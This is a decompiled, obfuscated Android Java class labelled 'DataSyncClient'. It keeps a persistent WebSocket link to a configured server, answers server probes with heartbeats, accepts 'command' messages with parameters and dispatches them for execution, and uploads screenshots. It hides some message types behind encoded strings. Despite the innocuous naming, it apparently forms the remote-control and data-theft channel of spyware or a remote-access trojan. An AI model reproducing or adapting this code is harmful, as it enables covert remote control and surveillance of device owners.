package com.storm.safe.rock.network;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import com.storm.safe.rock.util.StringUtil;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.concurrent.TimeUnit;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0577hd;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0873ms;
import p000.C1107qe;
import p000.C1108qf;
import p000.C1109qg;
import p000.C1180rh;
import p000.h10;
import p000.t60;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.network.a0 */
/* loaded from: classes2.dex */
public final class C0267a0 {

    /* renamed from: b5 */
    public static final C1107qe f52258b5 = new C1107qe(null);

    /* renamed from: b6 */
    public static volatile String f52259b6 = "";

    /* renamed from: a0 */
    public final Context f52260a0;

    /* renamed from: a1 */
    public final h10 f52261a1;

    /* renamed from: a2 */
    public final h10 f52262a2;

    /* renamed from: a3 */
    public volatile boolean f52263a3;

    /* renamed from: a4 */
    public volatile boolean f52264a4;

    /* renamed from: a5 */
    public volatile long f52265a5;

    /* renamed from: a6 */
    public volatile WebSocket f52266a6;

    /* renamed from: a7 */
    public volatile long f52267a7;

    /* renamed from: a8 */
    public final Object f52268a8 = new Object();

    /* renamed from: a9 */
    public String f52269a9 = "";

    /* renamed from: b0 */
    public String f52270b0 = "";

    /* renamed from: b1 */
    public final Handler f52271b1 = new Handler(Looper.getMainLooper());

    /* renamed from: b2 */
    public PowerManager.WakeLock f52272b2;

    /* renamed from: b3 */
    public final C0873ms f52273b3;

    /* renamed from: b4 */
    public final OkHttpClient f52274b4;

    public C0267a0(Context context, h10 h10Var, h10 h10Var2) {
        this.f52260a0 = context;
        this.f52261a1 = h10Var;
        this.f52262a2 = h10Var2;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        y21 y21Var = new y21();
        c1180rh.getClass();
        this.f52273b3 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c1180rh, y21Var));
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        this.f52274b4 = builder.connectTimeout(10L, timeUnit).readTimeout(0L, timeUnit).writeTimeout(10L, timeUnit).pingInterval(20L, timeUnit).retryOnConnectionFailure(false).build();
    }

    /* renamed from: a0 */
    public static final void m211359a0(C0267a0 c0267a0, String str) {
        JSONObject jSONObjectOptJSONObject;
        try {
            JSONObject jSONObject = new JSONObject(str);
            String strOptString = jSONObject.optString("type", "");
            if (strOptString != null) {
                switch (strOptString.hashCode()) {
                    case 3446776:
                        strOptString.equals("pong");
                        return;
                    case 106940336:
                        if (!strOptString.equals("probe")) {
                            return;
                        }
                        break;
                    case 950394699:
                        if (strOptString.equals("command") && (jSONObjectOptJSONObject = jSONObject.optJSONObject("data")) != null) {
                            c0267a0.m211365a6(jSONObjectOptJSONObject);
                            return;
                        }
                        return;
                    case 1142050467:
                        if (!strOptString.equals("ping_probe")) {
                            return;
                        }
                        break;
                    default:
                        return;
                }
                t60.m214702c3("DataSyncClient", "📡 收到服务端探测(" + strOptString + ")，立刻回 status/device_heartbeat");
                synchronized (c0267a0.f52268a8) {
                    if (c0267a0.f52263a3) {
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put("type", StringUtil.m212470a0("L1wHM049MyZSMDlNEz9MLA=="));
                        jSONObject2.put("deviceId", c0267a0.f52270b0);
                        jSONObject2.put("timestamp", System.currentTimeMillis());
                        JSONObject jSONObject3 = new JSONObject();
                        jSONObject3.put("type", "status");
                        jSONObject3.put("sessionId", c0267a0.f52270b0);
                        jSONObject3.put("data", jSONObject2);
                        jSONObject3.put("timestamp", System.currentTimeMillis());
                        WebSocket webSocket = c0267a0.f52266a6;
                        if (webSocket != null) {
                            String string = jSONObject3.toString();
                            t60.m214694b5(string, "msg.toString()");
                            webSocket.send(string);
                        }
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("DataSyncClient", "解析消息失败", e);
        }
    }

    /* renamed from: a1 */
    public final String m211360a1() throws IllegalStateException, NoSuchAlgorithmException, InvalidKeyException {
        String str = "wss";
        if (!AbstractC0779a1.m213679d2(this.f52269a9, false, "https") && !AbstractC0779a1.m213679d2(this.f52269a9, false, "wss")) {
            str = "ws";
        }
        String str2 = "";
        String strM213688e1 = AbstractC0779a1.m213688e1(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(this.f52269a9, "http://", ""), "https://", ""), "ws://", ""), "wss://", ""), '/');
        String str3 = this.f52270b0;
        String deviceKeySalt = f52258b5.getDeviceKeySalt();
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            Charset charset = AbstractC0577hd.f56650a0;
            byte[] bytes = deviceKeySalt.getBytes(charset);
            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
            mac.init(new SecretKeySpec(bytes, "HmacSHA256"));
            byte[] bytes2 = str3.getBytes(charset);
            t60.m214694b5(bytes2, "this as java.lang.String).getBytes(charset)");
            byte[] bArrDoFinal = mac.doFinal(bytes2);
            t60.m214694b5(bArrDoFinal, "digest");
            String strSubstring = AbstractC0134bh.m210726e9(bArrDoFinal, new h10() { // from class: com.storm.safe.rock.network.DataSyncClient$generateDeviceKey$1
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    return String.format("%02x", Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj).byteValue())}, 1));
                }
            }).substring(0, 32);
            t60.m214694b5(strSubstring, "this as java.lang.String…ing(startIndex, endIndex)");
            str2 = strSubstring;
        } catch (Exception e) {
            t60.m214705c6("DataSyncClient", "生成密钥失败", e);
        }
        String str4 = this.f52270b0;
        StringBuilder sb = new StringBuilder();
        sb.append(str);
        sb.append("://");
        sb.append(strM213688e1);
        sb.append("/ws/session?sessionId=");
        sb.append(str4);
        return AbstractC0003a2.m35b6(sb, "&key=", str2);
    }

    /* renamed from: a2 */
    public final void m211361a2() {
        synchronized (this.f52268a8) {
            if (this.f52263a3) {
                t60.m214702c3("DataSyncClient", "📡 已连接，跳过");
                return;
            }
            if (this.f52264a4) {
                long jCurrentTimeMillis = System.currentTimeMillis() - this.f52265a5;
                if (jCurrentTimeMillis < 12000) {
                    t60.m214702c3("DataSyncClient", "📡 正在连接中（" + jCurrentTimeMillis + "ms），跳过");
                    return;
                }
                t60.m214726f4("DataSyncClient", "⚠️ 连接超时（" + jCurrentTimeMillis + "ms），重置状态");
                this.f52263a3 = false;
                this.f52264a4 = false;
                this.f52265a5 = 0L;
            }
            if (this.f52269a9.length() != 0 && this.f52270b0.length() != 0) {
                this.f52264a4 = true;
                this.f52265a5 = System.currentTimeMillis();
                t60.m214714d6("DataSyncClient", "📡 开始连接: " + this.f52269a9);
                try {
                    String strM211360a1 = m211360a1();
                    long jCurrentTimeMillis2 = System.currentTimeMillis();
                    WebSocket webSocketNewWebSocket = this.f52274b4.newWebSocket(new Request.Builder().url(strM211360a1).header("Connection", "Upgrade").header("Upgrade", io.socket.engineio.client.transports.WebSocket.NAME).build(), new C1109qg(this, jCurrentTimeMillis2));
                    synchronized (this.f52268a8) {
                        if (!this.f52264a4) {
                            webSocketNewWebSocket.cancel();
                            return;
                        }
                        WebSocket webSocket = this.f52266a6;
                        if (webSocket != null) {
                            try {
                                webSocket.cancel();
                            } catch (Exception unused) {
                            }
                        }
                        this.f52266a6 = webSocketNewWebSocket;
                        this.f52267a7 = jCurrentTimeMillis2;
                        return;
                    }
                } catch (Exception e) {
                    t60.m214705c6("DataSyncClient", "❌ 创建WebSocket失败", e);
                    m211364a5();
                    return;
                }
            }
            t60.m214704c5("DataSyncClient", "❌ 未配置服务器地址或设备ID");
        }
    }

    /* renamed from: a3 */
    public final void m211362a3() {
        synchronized (this.f52268a8) {
            t60.m214714d6("DataSyncClient", "📡 断开连接");
            this.f52267a7 = 0L;
            try {
                WebSocket webSocket = this.f52266a6;
                if (webSocket != null) {
                    webSocket.close(1000, "Client disconnect");
                }
            } catch (Exception unused) {
            }
            this.f52266a6 = null;
            this.f52263a3 = false;
            this.f52264a4 = false;
            this.f52265a5 = 0L;
        }
        try {
            this.f52274b4.connectionPool().evictAll();
        } catch (Exception unused2) {
        }
        m211366a7();
        this.f52262a2.invoke(Boolean.FALSE);
    }

    /* renamed from: a4 */
    public final void m211363a4() {
        synchronized (this.f52268a8) {
            if (this.f52264a4) {
                long jCurrentTimeMillis = System.currentTimeMillis() - this.f52265a5;
                if (jCurrentTimeMillis > 15000) {
                    t60.m214726f4("DataSyncClient", "⚠️ 检测到连接卡住（" + jCurrentTimeMillis + "ms），强制重置");
                    this.f52263a3 = false;
                    this.f52264a4 = false;
                    this.f52265a5 = 0L;
                    try {
                        WebSocket webSocket = this.f52266a6;
                        if (webSocket != null) {
                            webSocket.cancel();
                        }
                    } catch (Exception unused) {
                    }
                    this.f52266a6 = null;
                }
            }
        }
    }

    /* renamed from: a5 */
    public final void m211364a5() {
        synchronized (this.f52268a8) {
            if (this.f52263a3 || this.f52264a4) {
                this.f52263a3 = false;
                this.f52264a4 = false;
                this.f52265a5 = 0L;
                this.f52266a6 = null;
                try {
                    this.f52274b4.connectionPool().evictAll();
                } catch (Exception unused) {
                }
                m211366a7();
                this.f52262a2.invoke(Boolean.FALSE);
            }
        }
    }

    /* renamed from: a6 */
    public final void m211365a6(JSONObject jSONObject) {
        try {
            String strOptString = jSONObject.optString("command", "");
            t60.m214694b5(strOptString, "command");
            if (strOptString.length() == 0) {
                return;
            }
            LinkedHashMap linkedHashMap = new LinkedHashMap();
            JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("params");
            if (jSONObjectOptJSONObject != null) {
                Iterator<String> itKeys = jSONObjectOptJSONObject.keys();
                t60.m214694b5(itKeys, "paramsJson.keys()");
                while (itKeys.hasNext()) {
                    String next = itKeys.next();
                    t60.m214694b5(next, "key");
                    Object obj = jSONObjectOptJSONObject.get(next);
                    t60.m214694b5(obj, "paramsJson.get(key)");
                    linkedHashMap.put(next, obj);
                }
            }
            Iterator<String> itKeys2 = jSONObject.keys();
            t60.m214694b5(itKeys2, "data.keys()");
            while (itKeys2.hasNext()) {
                String next2 = itKeys2.next();
                if (!t60.m214686a2(next2, "command") && !t60.m214686a2(next2, "params")) {
                    t60.m214694b5(next2, "key");
                    Object obj2 = jSONObject.get(next2);
                    t60.m214694b5(obj2, "data.get(key)");
                    linkedHashMap.put(next2, obj2);
                }
            }
            AbstractC0780a0.m213692a3(this.f52273b3, null, new DataSyncClient$parseAndExecuteCommand$3(strOptString, this, new C1108qf(strOptString, linkedHashMap), null), 3);
        } catch (Exception e) {
            t60.m214705c6("DataSyncClient", "解析命令失败", e);
        }
    }

    /* renamed from: a7 */
    public final void m211366a7() {
        try {
            PowerManager.WakeLock wakeLock = this.f52272b2;
            if (wakeLock == null || !wakeLock.isHeld()) {
                return;
            }
            PowerManager.WakeLock wakeLock2 = this.f52272b2;
            t60.m214692b3(wakeLock2);
            wakeLock2.release();
            t60.m214702c3("DataSyncClient", "WebSocket WakeLock 已释放");
        } catch (Exception unused) {
        }
    }

    /* renamed from: a8 */
    public final boolean m211367a8(String str) {
        synchronized (this.f52268a8) {
            boolean zSend = false;
            if (!this.f52263a3) {
                return false;
            }
            WebSocket webSocket = this.f52266a6;
            if (webSocket == null) {
                return false;
            }
            try {
                zSend = webSocket.send(str);
            } catch (Exception e) {
                t60.m214726f4("DataSyncClient", "发送异常: " + e.getMessage());
            }
            return zSend;
        }
    }

    /* renamed from: a9 */
    public final void m211368a9(String str, String str2) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", StringUtil.m212470a0("OFoDP0g2HyZYJQ=="));
            jSONObject.put("sessionId", this.f52270b0);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("image", str);
            jSONObject2.put("width", 0);
            jSONObject2.put("height", 0);
            jSONObject2.put("mode", str2);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            jSONObject.put("data", jSONObject2);
            jSONObject.put("timestamp", System.currentTimeMillis());
            String string = jSONObject.toString();
            t60.m214694b5(string, "message.toString()");
            m211367a8(string);
        } catch (Exception e) {
            t60.m214705c6("DataSyncClient", "发送截图失败", e);
        }
    }

    /* renamed from: b0 */
    public final boolean m211369b0(JSONObject jSONObject) {
        if (!this.f52263a3) {
            return false;
        }
        try {
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("type", "status");
            jSONObject2.put("sessionId", this.f52270b0);
            jSONObject2.put("data", jSONObject);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            String string = jSONObject2.toString();
            t60.m214694b5(string, "message.toString()");
            return m211367a8(string);
        } catch (Exception e) {
            t60.m214705c6("DataSyncClient", "发送状态失败", e);
            return false;
        }
    }
}
